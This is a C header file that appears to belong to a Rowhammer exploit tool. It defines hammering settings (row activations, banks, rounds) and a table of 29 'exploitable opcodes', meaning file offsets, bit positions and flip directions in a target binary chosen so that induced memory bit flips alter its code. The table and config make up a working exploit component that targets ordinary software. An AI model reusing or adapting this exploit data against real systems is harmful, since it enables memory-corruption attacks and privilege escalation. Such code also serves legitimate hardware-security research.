#ifndef UTIL_H
#define UTIL_H

#include <stdlib.h>
#include <inttypes.h>
#define BUFFER_SIZE (1ULL << 21)
#define ZERO_TO_ONE 1
#define ONE_TO_ZERO 2
#define NUM_EXPLOITABLE_OPCODES 29

#define pr_info(...) \
        fprintf(stdout, __VA_ARGS__); fflush(stdout)

#define pr_err(...) \
        fprintf(stderr, __VA_ARGS__); fflush(stderr)

#define pr_debug(...) \
        fprintf(stderr, __VA_ARGS__); fflush(stderr)

typedef struct _config {
	uint64_t num_row_activations;
	uint64_t hammering_rounds;
	uint64_t bank_n;
	uint64_t random_pairs;
        uint8_t random_mode;
	uint8_t print_rows;
	uint8_t all_banks;
        uint8_t verbose;
        uint8_t flip;
}hammer_config_t;

typedef struct __vuln_opcodes {
        unsigned file_offset;
        uint8_t bit_offset;
	uint8_t direction;
} vuln_opcode;

typedef struct __template {
        uintptr_t addr;
        vuln_opcode op;
} template_t;

vuln_opcode opcodes[NUM_EXPLOITABLE_OPCODES] = {
        {0x8c1c, 4, ONE_TO_ZERO},
        {0x8c32, 3, ONE_TO_ZERO},
        {0x8d4e, 0, ZERO_TO_ONE},
        {0x8d4f, 0, ONE_TO_ZERO},
        {0x8d59, 0, ZERO_TO_ONE},
        {0x8d59, 1, ZERO_TO_ONE},
        {0x8d59, 2, ZERO_TO_ONE},
        {0x8d59, 3, ONE_TO_ZERO},
        {0x8d59, 6, ONE_TO_ZERO},
        {0x8d5a, 5, ZERO_TO_ONE},
        {0x8d5d, 7, ZERO_TO_ONE},
        {0x8d5e, 0, ZERO_TO_ONE},
        {0x8d5f, 0, ONE_TO_ZERO},
        {0x8dbd, 3, ZERO_TO_ONE},
        {0x8dbd, 7, ONE_TO_ZERO},
        {0x8dbf, 0, ONE_TO_ZERO},
        {0x8dbf, 3, ZERO_TO_ONE},
        {0x8dc4, 3, ONE_TO_ZERO},
        {0x8dc5, 1, ZERO_TO_ONE},
        {0x8dc5, 2, ZERO_TO_ONE},
        {0x8dc9, 3, ZERO_TO_ONE},
        {0x8dc9, 4, ZERO_TO_ONE},
        {0x8dca, 7, ONE_TO_ZERO},
        {0x8dcb, 3, ZERO_TO_ONE},
        {0x8dcf, 0, ZERO_TO_ONE},
        {0x8dcf, 3, ZERO_TO_ONE},
        {0x8dd0, 2, ONE_TO_ZERO},
        {0x8dd1, 0, ONE_TO_ZERO},
        {0x8e23, 6, ONE_TO_ZERO},
};

/* Safely exit by unmapping
   the buffer. Bit hackish
   for now. */
void exit_safely(uint8_t *buffer){
    assert(munmap(buffer, BUFFER_SIZE) == 0);
    exit(EXIT_FAILURE);
}

#endif
